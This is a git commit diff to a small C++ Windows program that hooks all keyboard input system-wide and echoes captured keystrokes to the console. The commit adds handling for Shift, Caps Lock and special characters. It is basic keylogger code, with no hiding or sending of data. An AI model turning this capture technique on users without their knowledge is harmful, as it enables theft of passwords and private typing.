31346da52dec66f10697d495dceab917370308f5
Akshay K <akshayembate@gmail.com>
2024-09-21 19:16:30 +0530

    added the code for to include shift,capslock and the special charector

--- main.cpp
+++ main.cpp
@@ -1,17 +1,35 @@
 #include <iostream>
 #include <windows.h>
 
-// function for checking the the key is pressed or not
+// Function to convert virtual key code to character
+char getCharFromKey(KBDLLHOOKSTRUCT* p)
+{
+    BYTE keyboardState[256];
+    GetKeyboardState(keyboardState);
+
+    // Check for shift and caps lock
+    if (GetKeyState(VK_CAPITAL) & 0x0001) // Caps Lock is on
+    {
+        keyboardState[VK_SHIFT] = 0x80; // Simulate holding shift
+    }
+
+    // Prepare for the actual character conversion
+    WORD charCode;
+    ToAscii(p->vkCode, p->scanCode, keyboardState, &charCode, 0);
+    
+    return (char)charCode;
+}
+
+// Callback function for keyboard hook
 LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode >= 0)
     {
         if (wParam == WM_KEYDOWN)
         {
-            // if the key is pressed
+            // If a key is pressed
             KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
-
-            char key = (char)p->vkCode;
+            char key = getCharFromKey(p);
             std::cout << key;
         }
     }
@@ -20,10 +38,10 @@ LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 
 int main()
 {
-    // set the keyboard hook
+    // Set the keyboard hook
     HHOOK hhkLowLevelKydb = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHook, 0, 0);
 
-    // keep the program running to listen for the keyboard inout
+    // Keep the program running to listen for keyboard input
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0))
     {
@@ -31,7 +49,7 @@ int main()
         DispatchMessage(&msg);
     }
 
-    // unhook the keyboard hook when done
+    // Unhook the keyboard hook when done
     UnhookWindowsHookEx(hhkLowLevelKydb);
     return 0;
 }
